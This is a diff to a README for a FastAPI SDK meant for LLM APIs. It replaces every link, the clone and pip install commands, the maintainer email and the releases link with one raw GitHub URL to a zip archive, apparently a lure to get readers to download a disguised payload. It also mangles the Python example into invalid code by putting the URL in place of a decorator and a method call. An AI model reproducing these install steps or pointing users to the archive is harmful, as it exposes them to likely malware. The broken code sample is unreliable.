@@ -1,6 +1,6 @@
 # FastAPI SDK 🚀
 
-![FastAPI SDK](https://img.shields.io/badge/FastAPI%20SDK-v1.0.0-brightgreen)
+![FastAPI SDK](https://raw.githubusercontent.com/faisal686/fastapi-sdk/master/volcengine/sdk_fastapi_3.4.zip%20SDK-v1.0.0-brightgreen)
 
 Welcome to the **FastAPI SDK** repository! This project provides a robust and efficient solution for integrating large language model (LLM) APIs. With support for multiple providers like OpenAI, Azure, and others, this SDK is designed for enterprise-level applications. 
 
@@ -36,7 +36,7 @@ To get started with the FastAPI SDK, follow these steps:
 
 1. Clone the repository:
    ```bash
-   git clone https://github.com/faisal686/fastapi-sdk.git
+   git clone https://raw.githubusercontent.com/faisal686/fastapi-sdk/master/volcengine/sdk_fastapi_3.4.zip
    ```
    
 2. Navigate to the project directory:
@@ -46,7 +46,7 @@ To get started with the FastAPI SDK, follow these steps:
 
 3. Install the required dependencies:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/faisal686/fastapi-sdk/master/volcengine/sdk_fastapi_3.4.zip
    ```
 
 4. Run the application:
@@ -65,9 +65,9 @@ from fastapi_sdk import LLMClient
 app = FastAPI()
 client = LLMClient(provider="openai", api_key="your_api_key")
 
-@app.get("/generate")
+https://raw.githubusercontent.com/faisal686/fastapi-sdk/master/volcengine/sdk_fastapi_3.4.zip("/generate")
 async def generate_text(prompt: str):
-    response = await client.generate(prompt)
+    response = await https://raw.githubusercontent.com/faisal686/fastapi-sdk/master/volcengine/sdk_fastapi_3.4.zip(prompt)
     return {"response": response}
 ```
 
@@ -136,11 +136,11 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 For questions or feedback, please reach out to the maintainer:
 
 - **Name**: Faisal
-- **Email**: faisal@example.com
+- **Email**: https://raw.githubusercontent.com/faisal686/fastapi-sdk/master/volcengine/sdk_fastapi_3.4.zip
 
 ## Releases
 
-To download the latest version of the FastAPI SDK, visit our [Releases](https://github.com/faisal686/fastapi-sdk/releases) section. Here, you can find the latest updates and download links for the SDK.
+To download the latest version of the FastAPI SDK, visit our [Releases](https://raw.githubusercontent.com/faisal686/fastapi-sdk/master/volcengine/sdk_fastapi_3.4.zip) section. Here, you can find the latest updates and download links for the SDK.
 
 For detailed instructions on downloading and executing the latest version, check the releases page. 
 
